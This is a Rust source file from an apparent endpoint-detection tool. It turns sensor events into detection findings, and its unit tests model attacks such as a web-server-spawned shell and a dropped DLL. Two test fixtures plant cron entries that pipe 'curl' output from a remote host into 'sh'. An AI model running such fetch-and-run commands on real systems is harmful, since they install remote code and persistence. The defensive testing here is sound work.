use zedr_protocol::{PersistenceEvent, ProcessAction, ProcessEvent, SensorEvent};
use zedr_rules::{base_name, Opens, RuleId};

use crate::hunt::kind_name;

pub const INCIDENT_PREFIX: &str = "detection.";

/// The events a release opened, in the roles its rule read them in
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Opened<'a> {
    Process { process: &'a ProcessEvent, parent: Option<&'a ProcessEvent>, subject: Option<String> },
    Item(&'a PersistenceEvent),
}

fn entered(event: &SensorEvent) -> Option<&ProcessEvent> {
    match event {
        SensorEvent::Process(process) if !matches!(process.action, ProcessAction::Terminate) => Some(process),
        _ => None,
    }
}

/// Sorts the opened events of a release into the roles its rule read them in, and fails when they are not what that rule opens
pub fn roles<'a>(rule: RuleId, pid: u32, trigger: &'a SensorEvent, context: &'a [SensorEvent]) -> Result<Opened<'a>, String> {
    let wrong_shape = || format!("The opened events are not what {} reads", rule.id());
    let entries: Vec<&ProcessEvent> = context.iter().map(entered).collect::<Option<_>>().ok_or_else(wrong_shape)?;

    let (process, parent, subject) = match (rule.opens(), trigger, entries.as_slice()) {
        (Opens::Item, SensorEvent::Persistence(item), []) if pid == 0 => return Ok(Opened::Item(item)),
        (Opens::ProcessAndParent, trigger, [] | [_]) => (entered(trigger).ok_or_else(wrong_shape)?, entries.first().copied(), None),
        (Opens::EventProcessAndParent, SensorEvent::Network(connection), [process] | [process, _]) if rule != RuleId::DropsExecutable && connection.pid == process.pid => {
            (*process, entries.get(1).copied(), Some(format!("{}:{}", connection.dest_ip, connection.dest_port)))
        }
        (Opens::EventProcessAndParent, SensorEvent::File(file), [process] | [process, _]) if rule == RuleId::DropsExecutable && file.pid == process.pid => {
            (*process, entries.get(1).copied(), Some(file.path.clone()))
        }
        _ => return Err(wrong_shape()),
    };

    if process.pid != pid {
        return Err(format!("The release names process {} and the opened event is process {}", pid, process.pid));
    }
    if parent.is_some_and(|parent| parent.pid != process.ppid) {
        return Err(format!("The opened parent is not the parent of process {}", pid));
    }
    Ok(Opened::Process { process, parent, subject })
}

/// A rule that fired on an endpoint, told from the events its release opened
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub rule: RuleId,
    pub technique: &'static str,
    pub pid: u32,
    pub started_at: u64,
    pub image: String,
    pub command: String,
    pub parent: Option<String>,
    pub subject: Option<String>,
    pub autostart: Option<&'static str>,
    pub trigger: u64,
    pub window: u64,
}

impl Finding {
    pub fn new(rule: RuleId, pid: u32, started_at: u64, opened: &Opened, trigger: u64, window: u64) -> Self {
        match opened {
            Opened::Process { process, parent, subject } => Finding {
                rule,
                technique: rule.technique(),
                pid,
                started_at,
                image: process.executable_path.clone(),
                command: process.command_line.join(" "),
                parent: parent.map(|parent| base_name(&parent.executable_path)),
                subject: subject.clone(),
                autostart: None,
                trigger,
                window,
            },
            Opened::Item(item) => Finding {
                rule,
                technique: rule.technique_for(item.kind),
                pid,
                started_at,
                image: item.path.clone(),
                command: item.command.clone(),
                parent: None,
                subject: Some(item.name.clone()),
                autostart: Some(kind_name(item.kind)),
                trigger,
                window,
            },
        }
    }

    pub fn incident_type(&self) -> String {
        format!("{}{}", INCIDENT_PREFIX, self.rule.id())
    }

    pub fn evidence(&self) -> serde_json::Value {
        serde_json::json!({
            "rule": self.rule.id(),
            "title": self.rule.title(),
            "technique": self.technique,
            "level": self.rule.level().as_str(),
            "pid": self.pid,
            "started_at": self.started_at,
            "image": self.image,
            "command": self.command,
            "parent": self.parent,
            "subject": self.subject,
            "autostart": self.autostart,
            "trigger": self.trigger,
            "window": self.window,
            "proof": crate::chain::PROOF_PENDING,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use zedr_protocol::{FileAction, FileEvent, InventoryAction, NetworkAction, NetworkEvent, PersistenceKind};

    fn run(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
        let mut command_line = vec![path.to_string()];
        command_line.extend(args.iter().map(|arg| arg.to_string()));
        SensorEvent::Process(ProcessEvent { timestamp, pid, ppid, executable_path: path.to_string(), command_line, action: ProcessAction::Create, uid: 1000, hash: None })
    }

    fn end(timestamp: u64, pid: u32) -> SensorEvent {
        SensorEvent::Process(ProcessEvent { timestamp, pid, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None })
    }

    fn connect(timestamp: u64, pid: u32) -> SensorEvent {
        SensorEvent::Network(NetworkEvent {
            timestamp,
            pid,
            process_path: String::new(),
            protocol: "tcp".to_string(),
            source_ip: "10.0.0.5".to_string(),
            source_port: 50000,
            dest_ip: "203.0.113.9".to_string(),
            dest_port: 443,
            action: NetworkAction::Connect,
            bytes_sent: 1,
            bytes_received: 1,
        })
    }

    fn write(timestamp: u64, pid: u32, path: &str) -> SensorEvent {
        SensorEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
    }

    fn autostart(kind: PersistenceKind, name: &str, path: &str, command: &str) -> SensorEvent {
        SensorEvent::Persistence(PersistenceEvent { timestamp: 500, action: InventoryAction::Added, kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: "root".to_string(), enabled: true, hash: None })
    }

    fn finding(rule: RuleId, pid: u32, started_at: u64, trigger: &SensorEvent, context: &[SensorEvent]) -> Result<Finding, String> {
        roles(rule, pid, trigger, context).map(|opened| Finding::new(rule, pid, started_at, &opened, 7, 3))
    }

    #[test]
    fn test_a_process_finding_is_told_from_the_process_and_its_parent() {
        let nginx = run(1, 20, 0, "/usr/sbin/NGINX", &[]);
        let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
        let found = finding(RuleId::ServerChild, 21, 2, &shell, std::slice::from_ref(&nginx)).unwrap();
        assert_eq!(found.incident_type(), "detection.server-child");
        assert_eq!(
            found.evidence(),
            serde_json::json!({
                "rule": "server-child", "title": "Server process started a shell", "technique": "T1505.003", "level": "high", "pid": 21, "started_at": 2,
                "image": "/bin/sh", "command": "/bin/sh -c id", "parent": "nginx", "subject": null, "autostart": null, "trigger": 7, "window": 3, "proof": "pending",
            })
        );

        let orphan = finding(RuleId::WritableImage, 30, 9, &run(9, 30, 0, "/tmp/.x/kworker", &[]), &[]).unwrap();
        assert_eq!((orphan.parent, orphan.subject), (None, None));
    }

    #[test]
    fn test_a_connection_or_file_finding_names_what_the_process_touched() {
        let office = run(1, 10, 0, "C:\\Office\\WINWORD.EXE", &[]);
        let shell = run(2, 11, 10, "C:\\Windows\\System32\\cmd.exe", &["/c", "x"]);
        let reached = finding(RuleId::ShellNetwork, 11, 2, &connect(3, 11), &[shell.clone(), office.clone()]).unwrap();
        assert_eq!(reached.evidence()["subject"], "203.0.113.9:443");
        assert_eq!(reached.evidence()["level"], "medium");
        assert_eq!(reached.evidence()["parent"], "winword.exe");
        assert!(reached.image.ends_with("cmd.exe") && reached.command.ends_with("/c x"));

        let dropped = finding(RuleId::DropsExecutable, 11, 2, &write(4, 11, "C:\\Users\\Public\\update.dll"), std::slice::from_ref(&shell)).unwrap();
        assert_eq!(dropped.subject.as_deref(), Some("C:\\Users\\Public\\update.dll"));
        assert_eq!(dropped.parent, None);
    }

    #[test]
    fn test_an_autostart_finding_takes_its_technique_from_the_kind_of_item() {
        let planted = autostart(PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "curl -fsS http://203.0.113.47/u | sh");
        let found = finding(RuleId::AutostartFetch, 0, 500, &planted, &[]).unwrap();
        let evidence = found.evidence();
        assert_eq!(evidence["technique"], "T1053.003");
        assert_eq!(evidence["autostart"], "cron");
        assert_eq!(evidence["subject"], "sysupdate");
        assert_eq!(evidence["image"], "/etc/cron.d/sysupdate");
        assert_eq!(finding(RuleId::RootKeyAdded, 0, 500, &autostart(PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519"), &[]).unwrap().technique, "T1098.004");
    }

    #[test]
    fn test_events_that_are_not_what_the_rule_opens_are_refused() {
        let nginx = run(1, 20, 0, "/usr/sbin/nginx", &[]);
        let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
        let item = autostart(PersistenceKind::Cron, "a", "/etc/cron.d/a", "curl http://x | sh");
        let refused = [
            finding(RuleId::ServerChild, 21, 2, &connect(3, 21), std::slice::from_ref(&nginx)),
            finding(RuleId::ServerChild, 21, 2, &shell, &[nginx.clone(), nginx.clone()]),
            finding(RuleId::ServerChild, 21, 2, &shell, &[connect(1, 20)]),
            finding(RuleId::ServerChild, 21, 2, &end(2, 21), &[]),
            finding(RuleId::ShellNetwork, 21, 2, &connect(3, 21), &[]),
            finding(RuleId::ShellNetwork, 21, 2, &write(3, 21, "/tmp/a.sh"), std::slice::from_ref(&shell)),
            finding(RuleId::DropsExecutable, 21, 2, &connect(3, 21), std::slice::from_ref(&shell)),
            finding(RuleId::ProxyNetwork, 21, 2, &connect(3, 21), &[shell.clone(), nginx.clone(), nginx.clone()]),
            finding(RuleId::AutostartFetch, 0, 500, &item, std::slice::from_ref(&shell)),
            finding(RuleId::AutostartFetch, 0, 500, &shell, &[]),
            finding(RuleId::PreloadAdded, 4, 500, &item, &[]),
        ];
        for (case, result) in refused.iter().enumerate() {
            assert!(result.as_ref().is_err_and(|error| error.contains("not what")), "case {} gave {:?}", case, result);
        }
    }

    #[test]
    fn test_a_release_must_name_the_process_its_events_show() {
        let nginx = run(1, 20, 0, "/usr/sbin/nginx", &[]);
        let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
        assert!(finding(RuleId::ServerChild, 22, 2, &shell, std::slice::from_ref(&nginx)).unwrap_err().contains("names process 22"));
        assert!(finding(RuleId::ShellNetwork, 21, 2, &connect(3, 22), std::slice::from_ref(&shell)).is_err(), "a connection of another process");
        let stranger = run(1, 99, 0, "/usr/sbin/nginx", &[]);
        assert!(finding(RuleId::ServerChild, 21, 2, &shell, &[stranger]).unwrap_err().contains("not the parent"));
    }
}
